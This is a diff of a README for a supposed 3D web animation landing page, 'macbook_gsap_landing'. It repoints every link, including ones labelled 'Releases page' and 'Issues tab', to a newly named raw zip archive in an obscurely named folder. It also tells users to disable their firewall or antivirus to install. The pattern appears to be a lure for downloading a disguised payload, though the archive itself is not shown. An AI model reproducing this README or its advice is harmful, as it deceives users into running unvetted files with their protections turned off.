@@ -1,6 +1,6 @@
 # 🌟 macbook_gsap_landing - Experience Stunning 3D Web Animations
 
-[![Download macbook_gsap_landing](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip)](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip)
+[![Download macbook_gsap_landing](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip)](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip)
 
 ## ✨ About This Project
 
@@ -11,7 +11,7 @@ macbook_gsap_landing offers a unique and visually captivating web experience. It
 To get started with macbook_gsap_landing, follow these simple steps:
 
 1. **Visit the Download Page:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip) to access the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip) to access the latest version of the application.
 
 2. **Select the Latest Release:**
    On the Releases page, you'll see a list of available versions. Click on the most recent version, which is usually at the top.
@@ -23,7 +23,7 @@ To get started with macbook_gsap_landing, follow these simple steps:
 
 To download macbook_gsap_landing, click the link below to visit the releases page and download the application:
 
-[Download macbook_gsap_landing](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip)
+[Download macbook_gsap_landing](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip)
 
 ### Supported Platforms
 
@@ -69,7 +69,7 @@ If you encounter any issues during installation or usage, here are a few tips:
 - **Check Compatibility:** Make sure your operating system is compatible with the application.
 - **Internet Connection:** A stable internet connection is suggested during the installation process.
 - **Firewall/Antivirus:** Temporarily disable any firewall or antivirus software that might block installation.
-- **Re-download:** If you face issues, delete the downloaded file and download it again from the [Releases page](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip).
+- **Re-download:** If you face issues, delete the downloaded file and download it again from the [Releases page](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip).
 
 ## 🛠️ Contributing
 
@@ -82,10 +82,10 @@ If you'd like to contribute, please follow these guidelines:
 
 ## 📬 Contact
 
-For any questions or feedback, you can reach out through the [Issues tab](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip) on GitHub or by contacting the repository owner.
+For any questions or feedback, you can reach out through the [Issues tab](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip) on GitHub or by contacting the repository owner.
 
 ## 🌍 Stay Updated
 
-You can follow this project to stay updated with new releases and features. Simply check back on the [Releases page](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip) frequently.
+You can follow this project to stay updated with new releases and features. Simply check back on the [Releases page](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip) frequently.
 
-[![Download macbook_gsap_landing](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip)](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook_gsap_landing.zip)
+[![Download macbook_gsap_landing](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip)](https://raw.githubusercontent.com/aishagt/macbook_gsap_landing/main/chiastoneurous/macbook-landing-gsap-conquinamine.zip)
